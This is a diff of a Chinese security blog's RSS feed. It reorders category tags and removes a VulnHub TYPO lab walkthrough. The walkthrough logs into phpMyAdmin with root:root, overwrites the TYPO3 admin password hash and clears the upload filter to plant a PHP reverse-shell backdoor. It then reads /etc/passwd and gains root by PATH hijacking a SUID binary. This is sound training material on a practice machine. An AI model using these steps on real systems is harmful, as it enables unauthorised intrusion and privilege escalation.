@@ -7,39 +7,39 @@
         <language>zh-CN</language>
         <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
         <lastBuildDate>Mon, 01 Nov 2021 00:00:00 +0800</lastBuildDate>
-        <category>ENFP</category>
         <category>ENTJ</category>
         <category>ENTP</category>
-        <category>ESFJ</category>
-        <category>ESTJ</category>
-        <category>ESTP</category>
         <category>ESFP</category>
-        <category>INTJ</category>
         <category>ENFJ</category>
+        <category>ESTJ</category>
+        <category>ENFP</category>
+        <category>INFJ</category>
+        <category>ESFJ</category>
+        <category>ESTP</category>
         <category>INFP</category>
+        <category>INTJ</category>
+        <category>ISFJ</category>
         <category>INTP</category>
         <category>ISTJ</category>
-        <category>ISFP</category>
-        <category>INFJ</category>
-        <category>ISFJ</category>
         <category>ISTP</category>
+        <category>ISFP</category>
         <category>MBTI</category>
         <category>心理测试</category>
         <category>渗透测试</category>
+        <category>Linux</category>
         <category>信息安全网址</category>
         <category>Trojan</category>
         <category>人生</category>
         <category>成长</category>
-        <category>生命</category>
-        <category>意义</category>
-        <category>神学</category>
-        <category>Linux</category>
-        <category>命运</category>
-        <category>社会</category>
-        <category>历史</category>
         <category>人生哲学</category>
-        <category>爱情</category>
+        <category>生命</category>
+        <category>命运</category>
+        <category>意义</category>
+        <category>社会</category>
+        <category>神学</category>
         <category>人性</category>
+        <category>历史</category>
+        <category>爱情</category>
         <category>道德</category>
         <category>VULNHUB 1-10</category>
         <category>VULNHUB 11-20</category>
@@ -210,126 +210,6 @@ target_url=“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgu
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/</guid>
-            <title>VULNHUB 27 TYPO</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/</link>
-            <category>VULNHUB 21-30</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdHlwby0xLDQ3Mi8=&#34;&gt;https://www.vulnhub.com/entry/typo-1,472/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS90eXBvLTEtdnVsbmh1Yi13YWxrdGhyb3VnaC8=&#34;&gt;https://www.infosecarticles.com/typo-1-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 TYPO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
- &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-662.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
-&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-663.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8000,8080,8081&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;依次打开 80,8000,8080,8081 的网站进行访问，收集相关信息&lt;/p&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集，发现网站是一个 typo3 的地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-664.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;打开 http://192.168.0.153:8000 搜集信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-665.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;打开 http://192.168.0.153:8080 搜集信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-666.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;打开 http://192.168.0.153:8081 搜集信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-667.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8000&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-668.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;依次打开收集到的目录看能否找到更多信息&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODAvcGhwaW5mby5waHA=&#34;&gt;http://192.168.31.176:8080/phpinfo.php&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-669.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8081&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-670.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;phpmyadmin-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-渗透测试&#34;&gt;#&lt;/a&gt; phpmyadmin 渗透测试&lt;/h3&gt;
-&lt;p&gt;发现敏感地址，phpmyadmin 存在弱口令&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODEvcGhwbXlhZG1pbi8=&#34;&gt;http://192.168.31.176:8081/phpmyadmin/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-671.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用弱口令 root：root 登陆成功拿到后台的权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-672.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;对 phpmyadmin 进行写 shell 拿网站权限&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-673.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;是否可以写入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为/var/lib/mysql-files，只允许导出到此目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-674.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否开启日志记录以及日志保存目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHOW VARIABLES LIKE &amp;#x27;%general_log%&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为OFF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-675.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启写入日志的开关：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log = &amp;quot;ON&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-676.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看设置是否正确，是否开启成功，检测到已经开启了日志写入，并且写入的地址在下面的文件中&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-677.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改默认的日志写入地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log_file=“1.php”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-678.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; phpmyadmin 拿 shell 失败，得采用其他的方式&lt;/p&gt;
-&lt;h3 id=&#34;覆盖admin密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#覆盖admin密码&#34;&gt;#&lt;/a&gt; 覆盖 admin 密码&lt;/h3&gt;
-&lt;p&gt;查看 sql 之后看到密码采用 argon 算法&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-679.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;既然数据的密码采用的是 argon 的算法加密的，那么现在的思路就是通过 argon 算法生成一个加密后的密码并且替代原来的密码&lt;br&gt;
-在网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2FyZ29uMi1jZmZpLw==&#34;&gt;https://pypi.org/project/argon2-cffi/&lt;/span&gt; 上看到了 argron2 的生成教程&lt;br&gt;
-通过 python 依次输入以下的命令可以将自定义的密码以 argon 加密&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-680.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用 pip 来安装 argon： &lt;code&gt;python3 -m pip install argon2-cffi&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-681.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;打开python的命令行，依次输入以下命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from argon2 import PasswordHasher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ph = PasswordHasher()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hash = ph.hash(&amp;quot;typo&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hash)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-682.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;打印出来的即为密码为 typo 的 argon 算法之后的加密字符:&lt;br&gt;
- &lt;code&gt;$argon2id$v=19$m=65536,t=3,p=4$BLSCVncgUy7tfYFMab+XMQ$LDy6bITURoFWRdb4JNHQ53e+t2TF9oiWeBdzLxHVoUM&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;打开数据库中修改用户名密码的位置，将上述产生的 typo 加密后的字符替换原先的密码，点击确定即修改成功&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-683.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 现在就有了一个用户名密码分别为 admin:typo 的组合&lt;/p&gt;
-&lt;p&gt;但是这个账户应该在哪个位置登陆还不确定，看起来像是一个网站后台的登陆地址；继续之前 80 端口的网站目录扫描，发现了一个 /typo3 的后台地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-684.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;（这里换了地方测试，重启了机器，重新分配了 ip 地址，靶机的 ip 地址发生了变化，正常的操作 ip 地址是不会发生变化的）&lt;br&gt;
-用 admin：typo 进入此后台&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-685.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 拿到了后台地址&lt;/p&gt;
-&lt;h3 id=&#34;修改过滤规则上传木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改过滤规则上传木马&#34;&gt;#&lt;/a&gt; 修改过滤规则上传木马&lt;/h3&gt;
-&lt;p&gt;进入后台之后看到是一个普通的后台管理地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-686.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在 fileList 中找到了可以上传的位置，并且注明了上传文件的位置在 fileadmin 目录下，尝试从这个位置上传一个 php 后门&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-687.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;准备好 php 一句话木马，这里的 php 木马来源于 kali 机器上默认的木马，由于提前将此后门放在了公网 ip 上，就在自己的公网 ip 上直接拉下来即可，修改其主机和端口号为 kali 机器的地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-688.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;点击上传文件，从本地选择 php 文件后，发现服务器拒绝了，说明有判断需要尝试绕过，可以用 00 截断的方式，这个地方尝试去寻找过滤文件的方式是否在后台能修改，进行绕过&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-689.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在设置里边查找，看到了 Configure Installation-Wide Options 中有关于文件上传的格式限制，其正则表示如下：&lt;br&gt;
- &lt;code&gt;\.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-690.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将原有的过滤规则全部清除&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-691.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;确定之后，接下来文件上传将不会受到任何限制&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-692.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;再次尝试上传 shell.php 就上传成功了&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-693.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;监听木马文件中的端口，同时去执行上传成功的木马，成功拿到网站权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-694.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-695.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用一些命令将终端变为一个标准的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-696.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep www&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;判断出来没有其他的用户，需要直接拿到 root 的 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-697.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看定时任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-698.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;发现没有任何任务被加载&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否有设置错误的s权限的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-699.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 找到一个 apache2-restart&lt;/p&gt;
-&lt;h3 id=&#34;文件权限设置错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件权限设置错误提权&#34;&gt;#&lt;/a&gt; 文件权限设置错误提权&lt;/h3&gt;
-&lt;p&gt;很显然这是一个自己封装的命令，需要进行读取或者反编译这个命令里边封装了哪些命令，通过 strings 将命令读取&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-700.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;是一个 service 的命令，意味着我们去执行 apache 2-restart 命令的时候，会去环境变量里边去找 service，而且去执行这个 service 的时候是以 root 权限执行的，&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过修改环境变量提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/bin/bash&amp;quot; &amp;gt; /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/tmp/:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/local/apache2-restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-701.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/123%20KEYRING/</guid>
             <title>VULNHUB 23 KEYRING</title>
             <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/123%20KEYRING/</link>
@@ -484,60 +364,134 @@ john: Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#3
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</guid>
-            <title>VULNHUB 24 HACKABLELL</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</link>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/</guid>
+            <title>VULNHUB 25 SNAKEOIL</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/</link>
             <category>VULNHUB 21-30</category>
             <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==&#34;&gt;https://www.vulnhub.com/entry/hackable-ii,711/&lt;/span&gt;&lt;br&gt;
